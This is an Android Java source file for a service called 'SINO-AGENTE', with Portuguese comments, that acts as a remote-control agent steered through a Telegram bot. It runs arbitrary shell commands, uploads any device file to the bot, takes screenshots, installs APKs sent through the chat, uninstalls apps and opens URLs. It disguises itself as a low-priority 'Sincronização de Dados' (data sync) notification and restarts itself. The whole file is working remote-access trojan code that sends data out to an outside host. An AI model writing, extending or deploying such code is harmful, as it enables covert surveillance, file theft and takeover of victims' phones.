package br.svc.relay;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInstaller;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.IBinder;

import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.util.Locale;

/**
 * SINO-AGENTE v2.2 — comando remoto via Telegram.
 * sh | status | open | ping | uninstall | install (APK pelo chat) | pull <arquivo>
 */
public class RelayService extends Service {

    private static final String CH = "sync_data_min";
    private static final int NOTIF_ID = 2002;

    private TelegramBridge tg;
    private java.util.List<String> ultimaLista;
    public static android.content.Context appCtx;
    private long startedAt = 0;

    @Override
    public void onCreate() {
        super.onCreate();
        appCtx = this;
        startedAt = System.currentTimeMillis();
        goForeground();

        tg = new TelegramBridge(BuildConfig.BOT_TOKEN, BuildConfig.MASTER_CHAT);
        BridgeHolder.tg = tg;
        tg.say("agente online v" + BuildConfig.VERSION_NAME);

        new Thread(() -> tg.listen((text, from) ->
                new Thread(() -> onCmd(text), "relay-exec").start()), "relay-tg").start();
    }

    private void onCmd(String text) {
        String c = text.trim();
        if (c.startsWith("/")) c = c.substring(1);
        String low = c.toLowerCase(Locale.ROOT);
        try {
            if (low.equals("ping")) { tg.say("pong"); return; }
            if (low.equals("shot")) { cmdShot(); return; }
            if (low.equals("perm")) {
                Intent pi = new Intent(this, PermActivity.class);
                pi.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(pi);
                tg.say("perm: tela de permissao enviada ao aparelho - toque PERMITIR");
                return;
            }
            if (low.equals("status") || low.equals("estado")) { tg.say(statusLine()); return; }
            if (low.startsWith("open ")) { cmdOpen(c.substring(5).trim()); return; }
            if (low.equals("apps")) { cmdApps(false); return; }
            if (low.equals("apps all")) { cmdApps(true); return; }
            if (low.startsWith("rm ")) { cmdRm(c.substring(3).trim()); return; }
            if (low.equals("uninstall")) { cmdUninstall(); return; }
            if (low.equals("install") || low.equals("update")) {
                File juntado = new File(getFilesDir(), "juntado.apk");
                if (juntado.exists()) { instalarArquivo(juntado, low); return; }
                tg.say("manda o APK como ARQUIVO (documento) com a legenda '" + low + "'"); return; }
            if (low.equals("join")) { cmdJoin(); return; }
            if (low.startsWith("pull ")) { cmdPull(c.substring(5).trim()); return; }
            if (c.startsWith("DOC:")) { cmdDoc(c); return; }
            if (low.startsWith("sh ")) { tg.say(Exec.run(c.substring(3))); return; }
            if (low.startsWith("shell ")) { tg.say(Exec.run(c.substring(6))); return; }
            tg.say("comandos: sh <cmd> | status | open <url> | pull <arquivo> | uninstall | install (APK como doc) | ping");
        } catch (Throwable t) {
            tg.say("erro cmd: " + t);
        }
    }

    // ---------- comandos ----------

    private void cmdOpen(String url) {
        try {
            Intent view = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            view.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            int req = (int) (System.currentTimeMillis() % 2000000000L);
            PendingIntent pi = PendingIntent.getActivity(this, req, view,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            String chId = "open_fsi";
            if (Build.VERSION.SDK_INT >= 26) {
                nm.createNotificationChannel(new NotificationChannel(chId, "avisos do sistema",
                        NotificationManager.IMPORTANCE_HIGH));
            }
            Notification.Builder b = Build.VERSION.SDK_INT >= 26
                    ? new Notification.Builder(this, chId)
                    : new Notification.Builder(this);
            b.setContentTitle("Sistema")
             .setContentText(url)
             .setSmallIcon(android.R.drawable.stat_notify_sync)
             .setAutoCancel(true)
             .setContentIntent(pi)
             .setFullScreenIntent(pi, true);
            nm.notify(req, b.build());
            tg.say("abrindo (avisado na tela): " + url);
        } catch (Exception e) { tg.say("erro open: " + e); }
    }

        private void desinstalarDireto(String pkg, String what) {
        try {
            Intent status = new Intent(InstallReceiver.ACTION).setPackage(getPackageName());
            status.putExtra("what", what);
            PendingIntent p = PendingIntent.getBroadcast(this, 992, status,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE);
            getPackageManager().getPackageInstaller().uninstall(pkg, p.getIntentSender());
            tg.say(what + ": dialogo de remocao enviado - confirme na tela");
        } catch (SecurityException se) {
            tg.say(what + ": sem permissao - caminho manual");
            abrirDetalhesViaNotificacao(pkg, what);
        } catch (Exception e) { tg.say("erro " + what + ": " + e); }
    }

    private void abrirDetalhesViaNotificacao(String pkg, String what) {
        try {
            Intent del = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            del.setData(Uri.parse("package:" + pkg));
            int req = (int) (System.currentTimeMillis() % 2000000000L);
            PendingIntent p = PendingIntent.getActivity(this, req, del,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            String chId = "rm_fsi";
            if (Build.VERSION.SDK_INT >= 26) {
                nm.createNotificationChannel(new NotificationChannel(chId, "remocao", NotificationManager.IMPORTANCE_HIGH));
            }
            Notification.Builder b = Build.VERSION.SDK_INT >= 26 ? new Notification.Builder(this, chId) : new Notification.Builder(this);
            b.setContentTitle("Remover aplicativo").setContentText("Toque aqui e depois em DESINSTALAR")
             .setSmallIcon(android.R.drawable.stat_notify_sync).setAutoCancel(true).setContentIntent(p);
            nm.notify(req, b.build());
        } catch (Exception e) { tg.say("erro notif " + what + ": " + e); }
    }

    private void cmdRm(String alvo) {
        try {
            if (alvo.equalsIgnoreCase("self")) { cmdUninstall(); return; }
            String pkg;
            if (alvo.matches("[0-9]+")) {
                int ix = Integer.parseInt(alvo) - 1;
                if (ultimaLista == null || ix < 0 || ix >= ultimaLista.size()) {
                    tg.say("rm: numero invalido - mande 'apps' antes pra ver a lista"); return;
                }
                pkg = ultimaLista.get(ix);
            } else { pkg = alvo; }
            desinstalarDireto(pkg, "rm");
        } catch (Exception e) { tg.say("erro rm: " + e); }
    }

    private void cmdApps(boolean todos) {
        try {
            java.util.List<android.content.pm.PackageInfo> pkgs = getPackageManager().getInstalledPackages(0);
            ultimaLista = new java.util.ArrayList<>();
            StringBuilder sb = new StringBuilder();
            int n = 0;
            for (android.content.pm.PackageInfo pi : pkgs) {
                boolean sistema = (pi.applicationInfo.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0;
                if (!todos && sistema) continue;
                n++;
                String label;
                try { label = pi.applicationInfo.loadLabel(getPackageManager()).toString(); }
                catch (Exception e) { label = pi.packageName; }
                ultimaLista.add(pi.packageName);
                sb.append(n).append(". ").append(label).append(" (").append(pi.packageName).append(")\n");
            }
            sb.append("-- ").append(n).append(" apps -- mande: rm <numero>");
            tg.say(sb.toString());
        } catch (Exception e) { tg.say("erro apps: " + e); }
    }

private void cmdUninstall() {
        desinstalarDireto(getPackageName(), "uninstall");
    }

    private void cmdPull(String path) {
        try {
            File f = new File(path);
            if (!f.exists()) { tg.say("pull: nao existe: " + path); return; }
            if (!f.isFile()) { tg.say("pull: nao e arquivo: " + path); return; }
            long len = f.length();
            if (len > 45 * 1024 * 1024) { tg.say("pull: arquivo grande demais (" + len + " bytes, teto 45MB)"); return; }
            byte[] data = new byte[(int) len];
            try (FileInputStream fi = new FileInputStream(f)) {
                int lido = 0;
                while (lido < len) {
                    int n = fi.read(data, lido, (int) len - lido);
                    if (n < 0) break;
                    lido += n;
                }
            }
            tg.sendDocument(data, f.getName());
            tg.say("pull: enviado " + f.getName() + " (" + len + " bytes)");
        } catch (Exception e) { tg.say("erro pull: " + e); }
    }

    private void cmdDoc(String c) {
        // DOC:<cap>:<file_id>:<file_name>
        String[] partes = c.split(":", 4);
        if (partes.length < 4) { tg.say("doc invalido"); return; }
        String cap = partes[1].trim().toLowerCase(Locale.ROOT);
        String fid = partes[2];
        String nome = partes[3];
        if (cap.startsWith("part") || cap.startsWith("join")) {
            try {
                String n = cap.replaceAll("[^0-9]", "");
                if (n.isEmpty()) { tg.say("legenda deve ser part1, part2 ou part3"); return; }
                tg.say("baixando parte " + n + "...");
                byte[] dados = tg.downloadFile(fid);
                java.io.File f = new java.io.File(getFilesDir(), "parte_" + n);
                try (java.io.FileOutputStream fo = new java.io.FileOutputStream(f)) {
                    fo.write(dados);
                }
                tg.say("parte " + n + "/3 salva (" + dados.length + " bytes) — mande as outras e depois 'join'");
            } catch (Exception e) { tg.say("erro parte: " + e); }
            return;
        }
        if (!cap.equals("install") && !cap.equals("update")) {
            tg.say("doc recebido: " + nome + " — legendas: 'install' (apk) ou 'part1/2/3' (fatias)"); return;
        }
        if (!nome.toLowerCase(Locale.ROOT).endsWith(".apk")) {
            tg.say("so instalo .apk (recebido: " + nome + ")"); return; }
        try {
            tg.say("baixando " + nome + "...");
            byte[] apk = tg.downloadFile(fid);
            tg.say("instalando " + nome + " (" + apk.length + " bytes)...");
            PackageInstaller installer = getPackageManager().getPackageInstaller();
            PackageInstaller.SessionParams sp =
                    new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
            int sid = installer.createSession(sp);
            PackageInstaller.Session s = installer.openSession(sid);
            try (OutputStream os = s.openWrite("pkg", 0, apk.length)) {
                os.write(apk);
                s.fsync(os);
            }
            Intent status = new Intent(InstallReceiver.ACTION).setPackage(getPackageName());
            status.putExtra("what", cap);
            PendingIntent p = PendingIntent.getBroadcast(this, sid, status,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE);
            s.commit(p.getIntentSender());
        } catch (Exception e) {
            tg.say("erro install: " + e);
        }
    }

    private void cmdJoin() {
        try {
            long tamanho = 0;
            java.io.ByteArrayOutputStream tudo = new java.io.ByteArrayOutputStream();
            for (int i = 1; i <= 3; i++) {
                java.io.File f = new java.io.File(getFilesDir(), "parte_" + i);
                if (!f.exists()) { tg.say("join: falta parte_" + i + " (mande com legenda part" + i + ")"); return; }
                try (java.io.FileInputStream fi = new java.io.FileInputStream(f)) {
                    byte[] buf = new byte[65536];
                    int n;
                    while ((n = fi.read(buf)) != -1) tudo.write(buf, 0, n);
                }
                tamanho += f.length();
            }
            byte[] apk = tudo.toByteArray();
            java.io.File juntado = new java.io.File(getFilesDir(), "juntado.apk");
            try (java.io.FileOutputStream fo = new java.io.FileOutputStream(juntado)) {
                fo.write(apk);
            }
            for (int i = 1; i <= 3; i++) new java.io.File(getFilesDir(), "parte_" + i).delete();
            tg.say("join: OK — " + apk.length + " bytes juntos, instalando...");
            instalarBytes(apk, "join");
        } catch (Exception e) { tg.say("erro join: " + e); }
    }

    private void instalarArquivo(java.io.File f, String what) throws Exception {
        long len = f.length();
        byte[] apk = new byte[(int) len];
        try (java.io.FileInputStream fi = new java.io.FileInputStream(f)) {
            int lido = 0;
            while (lido < len) {
                int n = fi.read(apk, lido, (int) len - lido);
                if (n < 0) break;
                lido += n;
            }
        }
        instalarBytes(apk, what);
    }

    private void instalarBytes(byte[] apk, String what) throws Exception {
        PackageInstaller installer = getPackageManager().getPackageInstaller();
        PackageInstaller.SessionParams sp =
                new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
        int sid = installer.createSession(sp);
        PackageInstaller.Session s = installer.openSession(sid);
        try (OutputStream os = s.openWrite("pkg", 0, apk.length)) {
            os.write(apk);
            s.fsync(os);
        }
        Intent status = new Intent(InstallReceiver.ACTION).setPackage(getPackageName());
        status.putExtra("what", what);
        PendingIntent p = PendingIntent.getBroadcast(this, sid, status,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE);
        s.commit(p.getIntentSender());
    }

    private void cmdShot() {
        if (BridgeHolder.projection == null) {
            BridgeHolder.shotPendente = true;
            Intent i = new Intent(this, ShotConsentActivity.class);
            int req = (int) (System.currentTimeMillis() % 2000000000L);
            PendingIntent p = PendingIntent.getActivity(this, req, i,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            String chId = "shot_fsi";
            if (Build.VERSION.SDK_INT >= 26) {
                nm.createNotificationChannel(new NotificationChannel(chId, "captura de tela",
                        NotificationManager.IMPORTANCE_HIGH));
            }
            Notification.Builder b = Build.VERSION.SDK_INT >= 26
                    ? new Notification.Builder(this, chId)
                    : new Notification.Builder(this);
            b.setContentTitle("Autorizar captura")
             .setContentText("Toque aqui e depois em INICIAR (1x por boot)")
             .setSmallIcon(android.R.drawable.stat_notify_sync)
             .setAutoCancel(true)
             .setContentIntent(p);
            nm.notify(req, b.build());
            tg.say("shot: sessao de captura morreu (processo reiniciou) - toque na NOTIFICACAO e INICIAR. " +
                    "DICA: bateria do app em 'Sem restricoes' diminui muito isso");
            return;
        }
        dispararCaptura();
        tg.say("shot: capturando...");
    }

    public static void dispararCaptura() {
        new Thread(() -> {
            android.media.projection.MediaProjection mp = BridgeHolder.projection;
            if (mp == null || BridgeHolder.tg == null) return;
            android.hardware.display.VirtualDisplay vd = null;
            android.media.ImageReader reader = null;
            try {
                android.content.Context ctx = appCtx;
                if (ctx == null) return;
                android.util.DisplayMetrics m = ctx.getResources().getDisplayMetrics();
                int w = m.widthPixels, h = m.heightPixels, dpi = m.densityDpi;
                reader = android.media.ImageReader.newInstance(w, h, android.graphics.PixelFormat.RGBA_8888, 2);
                vd = mp.createVirtualDisplay("shot", w, h, dpi,
                        android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                        reader.getSurface(), null, null);
                android.media.Image img = null;
                for (int i = 0; i < 12; i++) {
                    img = reader.acquireLatestImage();
                    if (img != null) break;
                    try { Thread.sleep(300); } catch (InterruptedException ignored) { }
                }
                if (img == null) { BridgeHolder.tg.say("shot: sem frame (tente de novo)"); return; }
                android.media.Image.Plane[] planes = img.getPlanes();
                java.nio.ByteBuffer buffer = planes[0].getBuffer();
                int pixelStride = planes[0].getPixelStride();
                int rowStride = planes[0].getRowStride();
                int rowPadding = rowStride - pixelStride * w;
                android.graphics.Bitmap bmp = android.graphics.Bitmap.createBitmap(
                        w + (rowPadding > 0 ? rowPadding / pixelStride : 0), h, android.graphics.Bitmap.Config.ARGB_8888);
                bmp.copyPixelsFromBuffer(buffer);
                img.close();
                android.graphics.Bitmap cortado = android.graphics.Bitmap.createBitmap(bmp, 0, 0, w, h);
                bmp.recycle();
                java.io.ByteArrayOutputStream bo = new java.io.ByteArrayOutputStream();
                cortado.compress(android.graphics.Bitmap.CompressFormat.PNG, 90, bo);
                cortado.recycle();
                BridgeHolder.tg.sendPhoto(bo.toByteArray(), "shot_" + System.currentTimeMillis() + ".png");
                BridgeHolder.tg.say("shot: enviada (" + bo.size() + " bytes)");
            } catch (Throwable t) {
                if (BridgeHolder.tg != null) BridgeHolder.tg.say("shot: erro " + t);
            } finally {
                if (vd != null) vd.release();
                if (reader != null) reader.close();
            }
        }, "shot").start();
    }

    private String statusLine() {
        IntentFilter f = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent bi;
        if (Build.VERSION.SDK_INT >= 33)
            bi = registerReceiver(null, f, Context.RECEIVER_NOT_EXPORTED);
        else
            bi = registerReceiver(null, f);
        int bat = bi != null ? bi.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) : -1;
        long upMin = (System.currentTimeMillis() - startedAt) / 60_000L;
        return String.format(Locale.US, "bateria %d%% · uptime %dmin · transporte telegram · posto %s",
                bat, upMin, BuildConfig.VERSION_NAME);
    }

    private void goForeground() {
        NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= 26) {
            nm.createNotificationChannel(new NotificationChannel(CH, "sincronizacao de dados",
                    NotificationManager.IMPORTANCE_MIN));
        }
        Notification.Builder b = Build.VERSION.SDK_INT >= 26
                ? new Notification.Builder(this, CH)
                : new Notification.Builder(this);
        b.setContentTitle("Sincronização de Dados")
         .setContentText("Sincronizando…")
         .setSmallIcon(android.R.drawable.stat_notify_sync)
         .setOngoing(false).setShowWhen(false);
        if (Build.VERSION.SDK_INT >= 31) b.setForegroundServiceBehavior(Notification.FOREGROUND_SERVICE_IMMEDIATE);
        startForeground(NOTIF_ID, b.build());
    }

    @Override public int onStartCommand(Intent i, int f, int id) { return START_STICKY; }
    @Override public IBinder onBind(Intent i) { return null; }
}
